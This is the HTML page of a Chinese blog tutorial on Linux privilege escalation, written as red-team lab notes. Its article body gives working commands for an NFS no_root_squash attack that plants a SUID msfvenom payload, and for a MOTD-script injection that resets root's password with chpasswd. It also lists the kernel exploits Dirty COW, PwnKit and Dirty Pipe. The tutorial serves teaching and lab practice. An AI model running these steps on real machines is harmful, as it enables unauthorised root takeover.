@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="VnNixUxQwNBvFc-nAdXdfYkKhdk4ncl53flMSHEm1gw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="前言：这是红队笔记提权精讲中的第六部分，也是最后一部分 本章进入提权的“深水区”。我们将探讨如何利用系统底层服务的配置失误，以及如何使用公开的 CVE 漏洞代码直接攻击 Linux 内核。 实战：情况一：NFS 共享提权 (Net file system)利用场景：目标机器开启了 NFS (网络文件系统) 服务，且配置了极度危险的选项 no_root_squash。 原理：默认情况下，NFS 客户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权8：系统服务与底层内核漏洞 (红队笔记)">
+<meta property="og:url" content="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%838_%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="s0m1ng">
+<meta property="og:description" content="前言：这是红队笔记提权精讲中的第六部分，也是最后一部分 本章进入提权的“深水区”。我们将探讨如何利用系统底层服务的配置失误，以及如何使用公开的 CVE 漏洞代码直接攻击 Linux 内核。 实战：情况一：NFS 共享提权 (Net file system)利用场景：目标机器开启了 NFS (网络文件系统) 服务，且配置了极度危险的选项 no_root_squash。 原理：默认情况下，NFS 客户">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/ISW/Linux%E6%8F%90%E6%9D%83/8/NFS.png">
+<meta property="article:published_time" content="2026-03-20T03:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T10:49:37.965Z">
+<meta property="article:author" content="s0m1ng">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="经典方法">
+<meta property="article:tag" content="内核漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/ISW/Linux%E6%8F%90%E6%9D%83/8/NFS.png">
+
+<link rel="canonical" href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%838_%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linux提权8：系统服务与底层内核漏洞 (红队笔记) | s0m1ng</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="s0m1ng" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">s0m1ng</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/som1ng" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%838_%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/profile_photo.jpg">
+      <meta itemprop="name" content="s0m1ng">
+      <meta itemprop="description" content="学习逆向贵在坚持">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0m1ng">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux提权8：系统服务与底层内核漏洞 (红队笔记)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-20 11:00:00" itemprop="dateCreated datePublished" datetime="2026-03-20T11:00:00+08:00">2026-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-18 18:49:37" itemprop="dateModified" datetime="2026-03-18T18:49:37+08:00">2026-03-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/" itemprop="url" rel="index"><span itemprop="name">ISW</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/Linux%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">Linux提权</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+  
+  <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这是红队笔记提权精讲中的第六部分，也是最后一部分</p>
+<p>本章进入提权的“深水区”。我们将探讨如何利用系统底层服务的配置失误，以及如何使用公开的 CVE 漏洞代码直接攻击 Linux 内核。</p>
+<h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：NFS-共享提权-Net-file-system"><a href="#情况一：NFS-共享提权-Net-file-system" class="headerlink" title="情况一：NFS 共享提权 (Net file system)"></a>情况一：NFS 共享提权 (Net file system)</h2><p><strong>利用场景</strong>：目标机器开启了 NFS (网络文件系统) 服务，且配置了极度危险的选项 <code>no_root_squash</code>。</p>
+<p><strong>原理</strong>：默认情况下，NFS 客户端的 root 用户连接服务端时会被降权（Squash）为普通用户。但如果开启了 <code>no_root_squash</code>，<strong>客户端的 root 用户在挂载的共享目录中将拥有服务端的 root 权限</strong>。</p>
+<p><strong>提权逻辑</strong>：在我的 <strong>攻击机</strong> 上以 root 身份挂载你的共享目录 -&gt; 把我 <strong>攻击机</strong> 的 <code>/bin/bash</code> 拷贝进去并赋予 SUID -&gt; 靶机本地运行该 bash。</p>
+<p><strong>实战步骤：</strong></p>
+<ol>
+<li><strong>探测 NFS 配置</strong>：在靶机查看 <code>/etc/exports</code>，如果看到 <code>no_root_squash</code> 字样：例如 <code>/tmp *(rw,sync,no_root_squash,no_subtree_check)</code>就说明可以打NFS<br><img data-src="/images/ISW/Linux提权/8/NFS.png" alt="NFS"></li>
+</ol>
+<ol>
+<li><p><strong>在攻击机挂载共享目录</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先切换到root用户</span></span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/nfs</span><br><span class="line">mount -o rw,vers=3 目标IP:/tmp /tmp/nfs</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>植入 SUID 后门</strong>：在攻击机上，将自己的恶意文件拷贝进去，并以 root 身份赋权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=<span class="string">&quot;/bin/bash -p&quot;</span> -f elf -o /tmp/nfs/shell.elf</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>回到靶机触发</strong>：进入靶机的 <code>/tmp</code> 目录，运行刚刚植入的后门：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="情况二：利用-MOTD-机制提权"><a href="#情况二：利用-MOTD-机制提权" class="headerlink" title="情况二：利用 MOTD 机制提权"></a>情况二：利用 MOTD 机制提权</h2><p><strong>利用场景</strong>：MOTD (Message of The Day) 登录横幅脚本配置不当。</p>
+<p><strong>实战操作</strong>：</p>
+<ol>
+<li><p><strong>寻找可写脚本</strong>：<code>find /etc/update-motd.d/ -writable</code></p>
+</li>
+<li><p><strong>注入命令</strong>：<code>echo &quot;echo &#39;root:password123&#39; | chpasswd&quot; &gt;&gt; /etc/update-motd.d/00-header</code></p>
+</li>
+<li><p><strong>触发执行</strong>：再次通过 SSH 登录，脚本运行后 <code>su root</code> 即可。</p>
+</li>
+</ol>
+<h2 id="情况三：底层内核漏洞提权-Kernel-Exploit"><a href="#情况三：底层内核漏洞提权-Kernel-Exploit" class="headerlink" title="情况三：底层内核漏洞提权 (Kernel Exploit)"></a>情况三：底层内核漏洞提权 (Kernel Exploit)</h2><p>当上述所有配置枚举都失败，且 <code>uname -a</code> 显示内核版本存在已知 CVE 漏洞时使用。</p>
+<p>配合<strong>linux_exploit_suggester/linpeas</strong> + <strong>searchsploit</strong>来打</p>
+<h3 id="常用的漏洞"><a href="#常用的漏洞" class="headerlink" title="常用的漏洞"></a>常用的漏洞</h3><ol>
+<li><p><strong>Dirty COW (脏牛, CVE-2016-5195)</strong>：针对 2.6.22 &lt; 4.8.3。</p>
+</li>
+<li><p><strong>PwnKit (CVE-2021-4034)</strong>：针对 <code>pkexec</code> 工具，稳定性极高。</p>
+</li>
+<li><p><strong>Dirty Pipe (脏管, CVE-2022-0847)</strong>：针对 5.8+ 内核。</p>
+</li>
+</ol>
+<p>用法都在对应脚本里会给出</p>
+
+
+
+    
+    
+    
+        <div class="reward-container">
+  <div>您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>s0m1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%838_%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/" title="Linux提权8：系统服务与底层内核漏洞 (红队笔记)">http://example.com/2026/03/20/ISW/Linux本地提权/Linux提权8_系统服务与底层内核漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/" rel="tag"><i class="fa fa-tag"></i> 经典方法</a>
+              <a href="/tags/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="fa fa-tag"></i> 内核漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%837_%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE/" rel="prev" title="Linux提权7：信息泄露与敏感凭据 (红队笔记)">
+      <i class="fa fa-chevron-left"></i> Linux提权7：信息泄露与敏感凭据 (红队笔记)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%839_sudo%E9%A3%8E%E6%9A%B4_%E4%B8%8A/" rel="next" title="Linux提权9：sudo风暴_上 (红队笔记)">
+      Linux提权9：sudo风暴_上 (红队笔记) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">实战：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%83%85%E5%86%B5%E4%B8%80%EF%BC%9ANFS-%E5%85%B1%E4%BA%AB%E6%8F%90%E6%9D%83-Net-file-system"><span class="nav-number">2.1.</span> <span class="nav-text">情况一：NFS 共享提权 (Net file system)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%83%85%E5%86%B5%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8-MOTD-%E6%9C%BA%E5%88%B6%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.</span> <span class="nav-text">情况二：利用 MOTD 机制提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%83%85%E5%86%B5%E4%B8%89%EF%BC%9A%E5%BA%95%E5%B1%82%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83-Kernel-Exploit"><span class="nav-number">2.3.</span> <span class="nav-text">情况三：底层内核漏洞提权 (Kernel Exploit)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.3.1.</span> <span class="nav-text">常用的漏洞</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="s0m1ng"
+      src="/images/profile_photo.jpg">
+  <p class="site-author-name" itemprop="name">s0m1ng</p>
+  <div class="site-description" itemprop="description">学习逆向贵在坚持</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=1327470638&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;1327470638&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">s0m1ng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+function initCategoryFold() {
+  // 找到所有包含了子分类的 <ul>
+  var childLists = document.querySelectorAll('.category-list-child');
+  
+  childLists.forEach(function(child) {
+    // 防抖：防止 PJAX 刷新导致重复注入图标
+    if (child.parentElement.getAttribute('data-folded') === 'true') return;
+    child.parentElement.setAttribute('data-folded', 'true');
+    
+    // 1. 默认把所有子分类强行隐藏
+    child.style.display = 'none'; 
+    
+    // 2. 创建一个带有黑客风的 [+]/[-] 开关
+    var toggleSpan = document.createElement('span');
+    toggleSpan.innerHTML = ' ➕ ';
+    toggleSpan.style.cursor = 'pointer';
+    toggleSpan.style.fontSize = '12px';
+    toggleSpan.style.marginRight = '5px';
+    
+    // 3. 把开关插到父分类名字的前面
+    var parentLi = child.parentElement;
+    parentLi.insertBefore(toggleSpan, parentLi.firstChild);
+    
+    // 4. 给开关绑定点击事件 (Hook)
+    toggleSpan.addEventListener('click', function(e) {
+      e.stopPropagation(); // 阻止事件冒泡，防止误点分类链接
+      if (child.style.display === 'none') {
+        child.style.display = 'block';
+        toggleSpan.innerHTML = ' ➖ ';
+      } else {
+        child.style.display = 'none';
+        toggleSpan.innerHTML = ' ➕ ';
+      }
+    });
+  });
+}
+
+// 首次加载页面时执行
+document.addEventListener("DOMContentLoaded", initCategoryFold);
+// 如果你的 NexT 开启了 PJAX (无刷新跳转)，保证跳转后依然生效
+document.addEventListener("pjax:success", initCategoryFold);
+</script>
+</body>
+</html>
